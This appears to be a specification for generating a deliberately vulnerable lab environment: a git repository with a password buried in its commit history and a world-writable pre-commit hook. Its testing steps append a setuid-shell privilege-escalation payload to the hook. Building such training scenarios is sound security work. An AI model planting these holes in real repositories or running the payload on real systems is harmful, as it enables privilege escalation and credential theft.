---
id: insecure_git_repo
description: Creates a Git repository with sensitive information leaked in its commit history and weakly permissioned git hooks (e.g., pre-commit) that allow arbitrary command execution.
required_vars: [repo_path, leaked_secret]
---

# Atom: Insecure Git Repository
Creates a Git repository that exposes sensitive credentials in its commit history and contains writable git hooks, enabling both information disclosure and potential local privilege escalation or arbitrary code execution.

### Logic Requirements:
1. Initialize a bare or standard git repository at `<repo_path>`: `git config --global user.email "dev@example.com" && git config --global user.name "Dev" && mkdir -p <repo_path> && cd <repo_path> && git init`
2. Create initial benign commits.
3. Commit a file containing `<leaked_secret>`, then delete or modify it in a subsequent commit to hide it from the current working tree, leaving it accessible in the history.
4. Set weak permissions on `.git/hooks/` or a specific hook like `.git/hooks/pre-commit`: `touch .git/hooks/pre-commit && chmod 777 .git/hooks/pre-commit`

### Common Patterns:
- **Leaked Secrets in History:**
  ```bash
  mkdir -p /opt/app_source
  cd /opt/app_source
  git init
  echo "DB_PASS=SuperSecretPassword123!" > config.env
  git add config.env
  git commit -m "Add initial configuration"
  echo "DB_PASS=CHANGEME" > config.env
  git add config.env
  git commit -m "Remove hardcoded credentials from config"
  ```
- **Writable Git Hooks:**
  ```bash
  cd /opt/app_source
  echo '#!/bin/bash\necho "Running pre-commit checks..."' > .git/hooks/pre-commit
  chmod 777 .git/hooks/pre-commit
  ```
  An attacker with write access to `.git/hooks/pre-commit` can inject malicious commands. When a developer or automated process runs `git commit`, the injected commands will execute with the privileges of the user running `git commit`.

### Testing Guidance:
1. Verify the repository exists: `cd <repo_path> && git status`
2. Search the commit history for the leaked secret: `git log -p | grep "<leaked_secret>"` or use tools like `gitrob` or `trufflehog`.
3. Verify the hook permissions: `ls -l <repo_path>/.git/hooks/pre-commit` (it should be world-writable).
4. As a lower privileged user, append a payload to the hook: `echo "cp /bin/bash /tmp/pwned && chmod +s /tmp/pwned" >> <repo_path>/.git/hooks/pre-commit`
5. Trigger the hook (or simulate another user triggering it) by creating a commit: `git commit --allow-empty -m "Test commit"` and verify the payload executed.

### Synthesis Guidance:
Generate commands to set up the repository, commit the secret, bury the secret in history, and misconfigure the git hooks. Select realistic file names for the leaked secrets such as `config.php`, `aws.json`, or `.env`. Ensure that `git` is installed and a user context is available to run `git init` and `git commit` commands if they are being executed as part of the setup script.
